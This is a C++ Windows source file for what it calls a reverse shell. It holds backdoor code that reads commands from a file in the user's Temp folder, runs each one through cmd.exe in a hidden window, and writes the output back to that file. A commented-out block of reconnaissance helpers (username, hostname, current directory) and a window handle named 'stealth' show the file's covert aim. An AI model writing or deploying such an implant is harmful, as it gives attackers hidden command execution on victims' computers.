//Main headers

#include <winsock2.h>       //Socket connection
#include <windows.h>        //Used for WinApi calls
#include <ws2tcpip.h>       //TCP-IP Sockets
#include <stdio.h>
#include <fstream>
#include <vector>
#include <stdlib.h>
#pragma comment(lib, "Ws2_32.lib")
#define DEFAULT_BUFLEN 1024

// Debug headers
#include <iostream>

/*
void exec(char* returnval, int returnsize, char *fileexec)
{
    // std::cout << fileexec << std::endl;
    if (32 >= (int)(ShellExecute(NULL,"open", fileexec, NULL, NULL, SW_HIDE))) //Get return value in int
    {
        strcat(returnval, "[x] Error executing command..\n");
    }
    else
    {
        strcat(returnval, "\n");
    }
}

void whoami(char* returnval, int returnsize)
{
    DWORD bufferlen = 257;
    GetUserName(returnval, &bufferlen);
}

void hostname(char* returnval, int returnsize)
{
    DWORD bufferlen = 257;
    GetComputerName(returnval, &bufferlen);
}

void pwd(char* returnval, int returnsize) //Module 2
{
    TCHAR tempvar[MAX_PATH];
    GetCurrentDirectory(MAX_PATH, tempvar);
    strcat(returnval, tempvar);
}
*/

int RevShell()
{
    char *reply;
    std::string msg;
    std::vector<std::string> file_msg;   //Vector initialization
    std::vector<std::string>::const_iterator i;  //Vector counter initialiaztion
    std::string user_name(getenv("USERNAME"));
    std::string loc = "C:\\Users\\"+user_name+"\\AppData\\Local\\Temp\\debug.txt";
    std::ifstream ReadFile(loc);
    while (getline (ReadFile, msg)) {   // Output the text from the file
        if(msg!="0"){
            file_msg.push_back(msg);                    
        }
        else{
            ReadFile.close();
            return 0;
        }
    }
    ReadFile.close();
    
    std::ofstream WriteFile(loc);
    WriteFile << "0\n";   // Write to the file
    WriteFile.close();  // Close the file

    for(i=file_msg.begin()+1; i!=file_msg.end(); ++i){
        //std::cout<<(*i)<<std::endl;
        std::string temp = "/C "+*i+" >> "+loc;
        ShellExecute(0, "open", "cmd.exe", temp.c_str(), 0, SW_HIDE);
        Sleep(50);
        //std::cout<<temp<<std::endl;
        
    }
    

    return 0;

}

int main()
{
    HWND stealth;
    AllocConsole();
    stealth=FindWindowA("ConsoleWindowClass",NULL);
    ShowWindow(stealth,SW_SHOWNORMAL);
    RevShell();
    return 0;
}